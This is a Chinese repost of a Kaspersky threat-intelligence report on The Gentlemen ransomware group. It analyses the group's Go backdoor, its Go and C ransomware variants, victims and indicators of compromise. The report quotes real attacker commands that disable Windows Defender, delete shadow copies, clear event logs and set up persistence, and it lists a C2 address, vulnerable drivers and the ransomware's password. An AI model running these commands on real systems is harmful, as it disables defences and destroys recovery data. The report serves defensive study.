---
title: 【微信】The Gentlemen 来敲门 · 定制后门与演进战术
source: https://mp.weixin.qq.com/s/BsbD24mVvNSKIkcycyiIsw
source_host: mp.weixin.qq.com
clip_date: 2026-11-09T10:25:33+08:00
trace_id: 70c948ff-ffcd-4972-af11-5b006503b198
content_hash: 06d6b55b2901ab04bd40a022b7afcf30514072c90f5d55be1e03e25ced70e566
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 41375244-d011-813a-b277-f868c0068ac4
ioc:
  cves: []
  cwes: []
  hashes:
    - 02944c8a5535cdb5b2cbb893db2d5acf
    - 10ca9a4040001560d053b7e7885c1b95
    - 3b46a729db7ae6af8b19711c9452194d
    - 3c471ebc947cdf32240a90ffadf49b13
    - 407b6a136bbaa7172eb44ef9d08bb58a
    - 4be8bb62f0ebbcf4ce52c35ab6f794f5
    - 525ef6014f0ef20e44fe47c1d9980b69
    - 53c616677bc7e2a0a03127f19166d007
    - 5537c708edb9a2c21f88e34e8a0f1744
    - 554e699c96b332468f1ae69c1ae81ef9
    - 5761bd63da03686fc480245da7bd1e9f
    - 5c3b9821fc82a9028cb63b9671950919
    - 5f0b2c6d9f442754258bf4dd841c8341
    - 608faf58353b65c45ef9833358ac3787
    - 6ae7c9a7ea0b8c40a64225734f6bd01d
    - 73f0a8c3ea794a04e80c32038249f044
    - 846dc77c1246db20d976346e0e359502
    - 8f0577d28c4ff5f71b149f444bfaba8e
    - 9321a61a25c7961d9f36852ecaa86f55
    - adac9984b3cc43d66a0d33079bbec299
    - ae0e536766788478263bf448a9381641
    - b3e418d30312c1b2c58a791286868f42
    - b6b51508ad6f462c45fe102c85d246c8
    - b9986a0f1f1f1a798dc3f0c59a80a1a3
    - c2764744dcb4b0e1db79ca1e8bf65368
    - d12a5b36dd00586cc374a1cae43efed4
    - d2f72897e8986303d5567eb2384932b8
    - de1522f9219497632f30f8a6e72f26b6
    - edb1c480295250dd1a38f3aa1357deae
    - eef8a950952696b018aa9c6da2f5d7ad
    - fdae2beb813778b4540a997706862096
  domains: []
  tools: []
  techniques: []
---

**网络与信息安全参考** *2026年11月9日 08:00*

THREAT INTELLIGENCE / 威胁情报译丛2026.06.29

卡巴斯基研究人员分析了与 The Gentlemen RaaS 团伙相关的事件，披露了其使用的工具与 TTP，并发现了一个新的勒索软件变种。

全链路拆解：一个 RaaS 团伙如何从敲门走到加密

RaaSRANSOMWARE

![The Gentlemen RaaS 专题题图](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f390192a8117f8cc.jpg)

The Gentlemen RaaS 专题题图

文 / Fatih Şensoy、Maher Yamout　·　Securelist（卡巴斯基 GReAT）

ORIGINAL

目录 / TABLE OF CONTENTS

01引言INTRODUCTION

02技术细节TECHNICAL DETAILS

03受害者VICTIMS

04归因ATTRIBUTION

05结论CONCLUSION

06入侵指标INDICATORS OF COMPROMISE

01

PART

引言

INTRODUCTION

今年以来，The Gentlemen 的崛起引人注目，成为以 勒索软件即服务（RaaS） 模式运作的团伙中一个突出的例子。我们最初的评估认为该组织于 2025 年年中首次出现，但实际上，它从 2026 年初才开始显著加大活动力度。根据公开报告，按数据泄露站点（DLS）上公布的受害者数量计算，2026 年上半年该组织已跻身勒索软件团伙前十。

自 2026 年 2 月起，我们持续跟踪 The Gentlemen 的活动。该组织以全球大型企业和关键基础设施为目标，我们在观测中发现了其新的 战术、技术与程序（TTP），以及自行开发工具的迹象。本次研究还揭示了该组织的侦察手法、网络嗅探方式，以及其他多项 此前业界尚未公开描述过 的技术。

02

PART

技术细节

TECHNICAL DETAILS

### 初始感染途径

据多家网络安全厂商报告，The Gentlemen 及其附属团伙通常通过 利用在线服务中的漏洞，以及使用窃取所得或强度不足的登录凭据进入受害者系统。他们常以暴露在互联网上的 硬件 VPN、防火墙 等设备为目标，利用泄露的或默认的凭据获取访问权限。

我们认为，该组织很可能与其他攻击者或 初始访问代理（IAB） 合作，以获取对目标组织的访问权限。尽管他们往往在获得初始访问权限后数小时内就部署勒索软件，但我们对若干起攻击的分析显示，有些案例中，对受害者系统的访问 早在勒索软件部署之前很久 就已建立。这些案例涉及的战术与该组织一贯手法并不吻合，说明最初的入侵可能根本不是 The Gentlemen 所为，而是另一个团伙或初始访问代理完成的。

### 侦察

调查显示，The Gentlemen 使用 SharpADWS、NetScan、Advanced IP Scanner 和 netsh 等工具进行细致的内部侦察，以摸清目标环境并寻找可被利用的弱点。其中，SharpADWS 用于收集详细的 Active Directory 信息，包括域对象枚举；它通过把 LDAP 查询封装进 SOAP 消息，可绕过标准日志记录。该组织还使用 NetScan 与 Advanced IP Scanner 扫描网络，发现活跃端口与服务，识别潜在脆弱点，进而更深入地掌握网络结构，并对已识别的系统 建立远程控制。

攻击者利用微软的 netsh 工具抓取网络数据包、收集情报：执行命令 cmd.exe /Q /c netsh trace start capture=yes report=no filemode=circular overwrite=yes maxSize=4 > \\<target IP>\\ADMIN$\\{RANDOM-FILE-NAME} 2>&1 启动抓包，执行 cmd.exe /Q /c netsh trace stop > \\<target IP>\\ADMIN$\\{RANDOM-FILE-NAME} 停止抓包。

抓取到的数据会以随机文件名保存到共享的管理员目录中，可用 Wireshark 等工具分析，从中还原出未加密的网络通信、潜在密码等敏感信息；攻击者随后利用这些信息 发起针对性的勒索攻击。

### 横向移动

The Gentlemen 利用 NETLOGON 共享把勒索软件可执行文件分发到已加入域的计算机，从而 对多台设备同时发起攻击。为便于横向移动，他们使用一个定制 PowerShell 脚本 deploy_gpo.ps1，并针对每个目标系统设定专门的参数与变量。此外，他们还使用 PsExec 在目标系统上远程执行勒索软件二进制文件；当基于 GPO 的方式不可行时，这是一条替代的传播路径。

### 禁用安全产品

The Gentlemen 使用多种手段关闭目标计算机上的安全软件，其中包括 BYOVD（自带易受攻击驱动）技术：安装一个存在漏洞的驱动，利用其缺陷终止安全软件、获得不受限制的访问权限，然后发动勒索攻击。我们在该组织的攻击中观测到以下易受攻击的驱动。

驱动名称

说明

ProcessMonitorDriver.sys

Safetica DLP 与 EDR 驱动

wamsdk.sys

WatchDog 反恶意软件驱动

gamedriverx64.sys

Fedeen/Hotta 工作室反作弊驱动

biontdrv.sys

Paragon 分区管理工具驱动

inpoutx64.sys

一款用于管理 RGB 灯效的旧版驱动

wsftprm.sys

Topaz 反欺诈软件驱动

Havoc.sys

华为音频驱动

The Gentlemen 还使用 Windows Kernel Explorer 和 OpenArk64 等专用工具关闭安全软件。这类工具可以 拦截并阻断系统调用，甚至卸载安全驱动，使攻击者得以绕过安全防护而不被发现。

除此之外，该组织也会采用一些简单手段关闭安全软件，例如用 kavrmvr.exe 卸载卡巴斯基反病毒软件（该行为会被产品自身的 行为检测 拦截），以及修改 Windows 注册表设置以关闭 Windows Defender 的 实时保护。

registry (.reg)

Windows Registry Editor Version 5.00

\[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\]

"DisableAntiSpyware"=dword:00000001

\[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\]

"DisableBehaviorMonitoring"=dword:00000001

"DisableOnAccessProtection"=dword:00000001

"DisableScanOnRealtimeEnable"=dword:00000001

最后，攻击者还会通过执行多条 PowerShell cmdlet，尝试关闭 Windows Defender 的实时监控与勒索软件防护，并把自身加入排除列表——我们在后文将要分析的 Go 植入体 中观测到了这一行为：

powershell

Set-MpPreference -DisableRealtimeMonitoring $true -Force

Set-MpPreference -EnableControlledFolderAccess Disabled -Force

Add-MpPreference -ExclusionProcess <file_name>

Add-MpPreference -ExclusionPath 'C:\\\\'

### Go 语言后门

我们观测到一个定制植入体，以 Go 语言编写，在勒索攻击发生 前一天 部署，充当后门，可实现远程命令执行。该植入体收集系统信息（主机名、域名、UUID 和本地 IP 地址），并以 map 结构组织成 JSON 格式，键名包括 name、domain、uuid 和 localIPs。为获取系统 UUID，它使用 WMI 查询 "SELECT UUID FROM Win32_ComputerSystemProduct"。随后，它利用 Yamux 库与位于 81.177.215\[.\]15:9443 的 C2 服务器建立 持久化的双向 TCP 连接，把收集到的系统信息发送给 C2，并等待操作员指令：若响应字节为 'c'，则通过 cmd.exe /c 执行命令；若该字节为 's'，则建立 SOCKS 代理 连接。这一功能很可能用于让 The Gentlemen 的红队在目标网络内部横向跳转，扩大其扫描范围。

从该后门植入体的能力来看——双向通信、命令执行、建立 SOCKS 代理、信息收集——它显然也可以按需用于 扩展攻击链。在某一事件中，初始连接建立后不久，我们就看到服务器下发了侦察类命令，包括：

cmd

whoami

net group "Domain Admins" /domain

net group

dir c:\\

cd c:\\

### Go 语言勒索软件

传播最广的勒索软件二进制版本以 Go 语言编写，出现于 2025 年年中，此后在大多数攻击中被使用。它采用了一个此前未知的 Go 混淆器，会重命名符号、源码文件名和结构体，并改动函数签名，使分析更加困难。该二进制文件还内嵌了带说明的参数，表明这是一款 成熟度较高 的工具。参数如下表所示：

参数

说明

\--password

运行勒索软件所需的访问密码，同时用作反沙箱手段

\--path

以逗号分隔的待加密目标目录列表

\--T

加密开始前的延迟时间，单位为分钟

\--system

以 SYSTEM 身份运行的标志，仅加密本地驱动器

\--shares

仅加密已映射网络驱动器的标志

\--full

同时启用 --system 与 --shares 的标志

\--spread

横向移动标志；使用指定的域凭据（“domain.com\\user:pass”）或单个空格（“ ”）以沿用当前会话

\--gpo

通过组策略向所有域内计算机部署的标志（设计为在域控制器上执行）

\--silent

静默模式：跳过文件重命名、加密后修改文件更新时间以及更换壁纸等操作

\--keep

阻止可执行文件在加密完成后自删除的标志

\--wipe

加密后擦除磁盘空闲空间的标志

\--no-admin

强制在无管理员权限的情况下执行的标志

\--fast

速度标志，将处理/加密范围限制为文件的 9%

\--superfast

速度标志，将处理/加密范围限制为文件的 3%

\--ultrafast

速度标志，将处理/加密范围限制为文件的 1%

自动化系统执行防护

该勒索软件的 Go 版本在设计上以规避检测、阻碍分析为目标。运行时需要提供密码，当前设定的密码为 CbdU8EgF。该密码充当一道屏障，防止二进制文件在 沙箱或自动化环境 中运行。若输入错误密码或未提供密码，二进制文件将直接退出。

通过 GPO 部署的横向移动

使用 --gpo 参数时，勒索软件会通过组策略向网络中的其他计算机传播。为此，它根据目标环境生成 PowerShell 命令，写入 %temp% 文件夹下名为 deploy_gpo.ps1 的文件，然后执行该脚本。

生成的脚本使攻击者能够把勒索软件 迅速扩散到整个企业网络。脚本首先定位域控制器并加载用于控制它的工具，随后把自身复制到 NETLOGON 网络文件夹，使所有计算机都能访问。

为防止攻击被拦截，脚本会创建一个 伪造的系统更新策略 来关闭 Windows Defender：它把所有已连接计算机上的 DisableRealtimeMonitoring 设置为 1，从而关闭实时扫描与安全功能。脚本还会在 SYSVOL 目录下创建 ScheduledTasks.xml 文件来布置一个隐藏任务，并修改 Active Directory 属性 gPCMachineExtensionNames 以注册该恶意 XML 文件。最后，脚本通过执行 gpupdate /force 命令，强制网络中所有计算机立即更新策略，使所有计算机 同时下载并运行 勒索软件。

通过 PsExec 的横向移动

除通过组策略传播外，当提供 --spread 参数时，勒索软件还会使用 PsExec 进行横向移动。若目标系统上没有 PsExec，它会用以下命令下载该工具：

powershell

powershell.exe -Command "Invoke-WebRequest -Uri 'https://live.sysinternals\[.\]com/PsExec.exe' -OutFile 'C:\\Temp\\psexec.exe'"

随后，勒索软件通过 PowerShell cmdlet 安装并使用 远程服务器管理工具（RSAT），对整个域进行详尽扫描。如果 PowerShell 命令执行失败，则改用 NetServerEnum API。

powershell

try {

　Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0" -ErrorAction Stop

}

catch {}

try {

　DISM.exe /Online /Add-Capability /CapabilityName:"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"

}

catch {}

try {

　Install-WindowsFeature RSAT-AD-PowerShell -ErrorAction Stop

}

catch {}

try {

　Import-Module ActiveDirectory -ErrorAction Stop

　Get-ADComputer -Filter \* | Select-Object -ExpandProperty Name

}

catch {}

获取域内所有计算机的列表后，勒索软件通过 ping.exe -n 1 -w 500 {target} 命令逐个探测主机是否在线。若发现某台计算机处于活跃状态，便使用 PsExec 向其传播。

加密前的活动

在正式开始加密文件之前，勒索软件会尝试停止所有 处于运行状态的 Hyper-V 虚拟机，以便加密其虚拟磁盘文件。它通过 PowerShell 命令实现这一点，包括：

powershell

Get-VM | Stop-VM -Force -TurnOff

Get-VM | Where-Object State -eq 'Running' | Stop-VM -Force -TurnOff

勒索软件还会使用 taskkill.exe 终止特定进程，并使用 sc.exe 禁用和停止特定服务。进程与服务清单相当长，涵盖各类常见软件，例如 Microsoft Office 实例、数据库管理界面、远程管理软件、备份应用等。

在停止并终止清单中的全部服务与进程后，勒索软件通过以下方式确保自身 在系统上的持久化：

-   删除并重建名为 “UpdateUser” 的计划任务，以便在开机时运行勒索软件
    
-   添加注册表键，以便在开机时运行勒索软件
    

所用命令如下：

cmd

schtasks.exe /Delete /TN "UpdateUser" /F

schtasks.exe /Create /SC ONSTART /TN "UpdateUser" /TR "<ransomware_path>"

reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "GupdateS" /t REG_SZ /d "<ransomware_path>" /f

加密过程

完成准备工作后，勒索软件开始使用一种结合 Curve25519 与 XChaCha20 流密码的混合加密算法加密文件。对每个待加密文件，它都会生成一对 Curve25519 密钥，并与内嵌在代码中的攻击者公钥计算共享密钥——该公钥以 Base64 编码为 HvzC6Dq/siFthWSgE5ozZyQDu9cyxIoxb3NuRHI6pDM=。

加密文件之前，勒索软件会把文件访问权限改为 “Everyone”，并通过覆盖文件的 访问控制列表（ACL） 与 访问控制项（ACE） 获得完全管理权限，所用命令如下：

-   takeown.exe /f <target_file> /d y
    
-   icacls.exe <target_file> /grant \*S-1-1-0:F
    

勒索软件还内置了一份目录、文件与扩展名黑名单，以避免加密 关键系统组件。

加密过程开始时，勒索软件会在每个目录下创建名为 README-GENTLEMEN.txt 的文件，其中包含带有受害者 ID、Tox ID 和数据泄露站点地址的勒索说明。若未提供 --silent 参数，它还会把桌面壁纸更换为 The Gentlemen 内嵌的图片。

![图 1：The Gentlemen 内嵌在勒索软件中的桌面壁纸，画面中五个戴礼帽的形象配有 “YOUR NETWORK IS LOCKED BY THE GENTLEMEN” 字样](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/59275b6c072d6d28.png)

图 1：The Gentlemen 内嵌在勒索软件中的桌面壁纸，画面中五个戴礼帽的形象配有 “YOUR NETWORK IS LOCKED BY THE GENTLEMEN” 字样

完成上述操作后，若提供了 --wipe 参数，勒索软件可能 擦除系统空闲空间，以阻碍数据恢复尝试；此外，若未提供 --keep 参数，它还会自删除。

无论是否提供参数，它都会删除各类系统文件与日志以掩盖痕迹，所用命令例如：

cmd

vssadmin.exe delete shadows /all /quiet

wmic.exe shadowcopy delete

wevtutil.exe cl System

wevtutil.exe cl Application

wevtutil.exe cl Security

它还会删除多个目录中的文件，包括：

cmd

cmd.exe /C del /f /q C:\\Windows\\Prefetch\\\*.\*

cmd.exe /C del /f /q C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\\*.\*

cmd.exe /C del /f /q %SystemRoot%\\System32\\LogFiles\\RDP\*\\\*.\*

cmd.exe /C rd /s /q C:\\$Recycle.Bin

### C 语言勒索软件

随着 The Gentlemen 的活动范围不断扩大，来自不同信息安全厂商的多位研究人员已识别出 两个勒索软件植入体版本：上文所述的跨平台 Go 变种，以及一个面向 Linux 的、以 C 语言编写的 ESXi 加密器。我们的调查还发现了一个仍在开发中的新型 C 语言植入体，目前仅针对 Windows。

这一新型勒索软件变种目前仅在 少量针对组织的攻击 中被观测到。尽管其整体恶意代码结构与前述 Go 变种相似，但加密算法发生了显著变化，说明 The Gentlemen 正在 扩展其能力。我们认为该变种仍处于开发阶段，正在一小部分受害者身上测试；其若干参数选项如下所示。

参数

说明

\--password

勒索软件需要密码才能执行，旨在防止在自动化系统上运行

\--remove

加密过程结束后，勒索软件会删除自身

\--T

加密前的休眠时间，单位为秒

\--ex

很可能表示排除对象（尚未实现）

\--fast

加密速度选项（尚未实现）

\--superfast

加密速度选项（尚未实现）

\--ultrafast

加密速度选项（尚未实现）

\--silent

很可能是静默执行（尚未实现）

\--system

以系统权限执行。与 Go 变种一样，可能用于加密本地磁盘，但截至本文撰写时，尚无足够数据支持这一判断。

\--shares

加密连接到系统的共享（尚未实现）

\--full

完全加密（尚未实现）

\--path

待加密的目录列表

从参数列表可以看出，部分参数尚未实现。我们预计该变种将逐步成熟，并可能在未来的攻击中被越来越多地使用。值得注意的是，与 Go 变种相比，C 变种使用的文件、目录与扩展名排除名单更小，这进一步表明该版本仍在开发中。例如，不应被加密的文件清单只有三项，其中一项是该组织自己的勒索说明。

当收到 --system 参数时，为以提升的权限执行，植入体会使用命令 schtasks /create /sc DAILY /tn "TaskSystem" /tr "cmd /C cd %s && %s" /st 20:00 /ru system > nul 创建一个名为 “TaskSystem” 的计划任务，然后通过 schtasks /run /tn TaskSystem > nul 以提升的权限运行该任务。若目标系统中已存在 “TaskSystem”，勒索软件会先用 schtasks /delete /tn TaskSystem /f > nul 将其删除，再以相同名称重建。

如果勒索软件权限不足、无法访问某个文件，它会尝试修改该文件的 ACL，授予 FULL_CONTROL 权限，并通过 SetEntriesInAclA API 调用设置新的 EXPLICIT_ACCESS_A 结构。

加密方面，该勒索软件使用 OpenSSL 库，并以静态链接方式编译进二进制文件。与 Go 变种不同，该变种采用 AES256-GCM + RSA 加密方案：为每个文件生成一个随机的 32 字节密钥和一个 16 字节初始化向量（IV），组成 48 字节缓冲区；该缓冲区随后用硬编码的 RSA 公钥加密，并追加到文件末尾，文件内容则以 AES256-GCM 加密，写在加密后的密钥与 IV 之后。

加密完某个目录下的所有文件后，勒索软件使用 单字节 XOR 解密 还原一段字节数组，并在该目录下创建名为!-READ-ME—-GEN-TLE-MEN-!.txt 的文件，把包含勒索说明的字节数组写入其中。

该版本勒索软件中的勒索说明显示出与早期 Go 版本的差异：与操作员的沟通方式已改为电子邮件，而不再通过 Tox Messenger。

完成加密过程后，勒索软件会尝试使用 EvtClearLog API 清除多个事件日志类别，包括 System、Forwarded Events、Application 和 Setup。不过，事件日志清除过程似乎存在一处错误：类别 "S" 并不是事件日志类别的合法默认项，这提示可能存在 拼写错误或参数缺失。

![图 2：反编译得到的事件日志清除函数，可见其在清除 “System”“Forwarded Events”“S”“Application”“Setup” 五个类别](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bb93c82521b05902.png)

图 2：反编译得到的事件日志清除函数，可见其在清除 “System”“Forwarded Events”“S”“Application”“Setup” 五个类别

03

PART

受害者

VICTIMS

The Gentlemen 的攻击目标覆盖全球多个行业，包括制造业、IT 服务、医疗保健、金融服务、建筑和物流。已观测到的入侵涉及多个地区；根据我们的遥测数据，巴西、中国、印度尼西亚、中国台湾和泰国是受攻击最严重的国家和地区。

04

PART

归因

ATTRIBUTION

我们 高度确信 观测到的活动可归因于 The Gentlemen 及其附属团伙。这一归因基于若干关键因素，包括在二进制文件和勒索说明中一致地使用了该组织的名称、关联的电子邮件地址以及数据泄露站点。

05

PART

结论

CONCLUSION

The Gentlemen 正在勒索软件生态中 迅速崛起，不断招募附属成员并实施高关注度攻击。其适应能力体现在多个方面：一个以 C 语言编写的勒索软件变种出现，一个支持远程命令执行的 Go 语言后门，以及针对特定目标定制的脚本。近期泄露的数据暴露了其内部沟通与行动计划，这表明该组织 将继续从事恶意活动。

RECOMMENDATION

建议各组织优先做好漏洞管理与系统加固，以降低被入侵的风险。

06

PART

入侵指标

INDICATORS OF COMPROMISE

有关本次活动的更多信息（包括入侵指标），可供 卡巴斯基情报报告服务（Kaspersky Intelligence Reporting Service）的客户获取。如有兴趣，请联系 intelreports@kaspersky.com。

HASHGo 勒索软件

3B46A729DB7AE6AF8B19711C9452194D

locker_eryoo5_windows_amd64

02944C8A5535CDB5B2CBB893DB2D5ACF

locker_lqy8xb_windows_amd64.exe

10CA9A4040001560D053B7E7885C1B95

locker_28f3cl_windows_386.exe

3C471EBC947CDF32240A90FFADF49B13

locker_aga19g_windows_amd64.exe

4BE8BB62F0EBBCF4CE52C35AB6F794F5

locker_wh54td_windows_386.exe

53C616677BC7E2A0A03127F19166D007

locker_p663zs_windows_amd64.exe

5C3B9821FC82A9028CB63B9671950919

locker.exe

5F0B2C6D9F442754258BF4DD841C8341

locker_t1zged_windows_amd64.exe

608FAF58353B65C45EF9833358AC3787

locker_u90lyt_windows_amd64.exe

6AE7C9A7EA0B8C40A64225734F6BD01D

gentle.exe

846DC77C1246DB20D976346E0E359502

locker_p663zs_windows_386.exe

ADAC9984B3CC43D66A0D33079BBEC299

UcAaJ_o_1j9srso9a14071ps4p7s3f81s1b

AE0E536766788478263BF448A9381641

cosmo.exe

B3E418D30312C1B2C58A791286868F42

system_386.exe

C2764744DCB4B0E1DB79CA1E8BF65368

getlwd.exe

D12A5B36DD00586CC374A1CAE43EFED4

locker_c65ffp_windows_amd64.exe

D2F72897E8986303D5567EB2384932B8

UcAaJ_o_1j9srso9a14071ps4p7s3f81s1b

DE1522F9219497632F30F8A6E72F26B6

locker_c7ekh7_windows_amd64.exe

FDAE2BEB813778B4540A997706862096

AIR.exe

HASHC 语言勒索软件

B9986A0F1F1F1A798DC3F0C59A80A1A3

fin.exe

HASH后门

554E699C96B332468F1AE69C1AE81EF9

sihost.exe

HASH易受攻击的驱动

5761BD63DA03686FC480245DA7BD1E9F

processmonitordriver.sys

B6B51508AD6F462C45FE102C85D246C8

wamsdk.sys

8F0577D28C4FF5F71B149F444BFABA8E

gamedriverx64.sys

525EF6014F0EF20E44FE47C1D9980B69

biontdrv_wink.sys

407B6A136BBAA7172EB44EF9D08BB58A

biontdrv_winbs.sys

9321A61A25C7961D9F36852ECAA86F55

inpoutx64.sys

73F0A8C3EA794A04E80C32038249F044

wsddprm.sys

EEF8A950952696B018AA9C6DA2F5D7AD

havoc.sys

HASH扫描工具

EDB1C480295250DD1A38F3AA1357DEAE

netscan64.exe

5537C708EDB9A2C21F88E34E8A0F1744

Advanced_IP_Scanner_2.5.4594.1.exe

PATH文件路径

\\\\Netlogon\\

C:\\Sharing

C:\\Temp

C:\\Netlogon

C:\\Windows\\sysvol\\domain\\scripts\\

%TEMP%

%User%\\Downloads

%User%\\Desktop

IOC域名与 IP

81\[.\]177\[.\]215\[.\]15

后门 C2

原文信息

SOURCE

原文标题：The Gentlemen are knocking: custom backdoors and evolving tactics

页面标题：The Gentlemen RaaS: rapid growth and a new ransomware variant

作者：Fatih Şensoy、Maher Yamout

来源：Securelist（卡巴斯基 GReAT 全球研究与分析团队）

发布日期：2026 年 6 月 29 日

原文链接：https://securelist.com/the-gentlemen-raas/120447/

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b68c31b095f76b36.webp)

更多 山东区域 卡巴斯基 Next 安全解决方案 详情，请联系：

高进 - 186 6376 1060

如果你觉得今天这篇有收获，欢迎点赞、在看、转发三连，我们下篇见

赞

在看

收藏

THANKS FOR READING
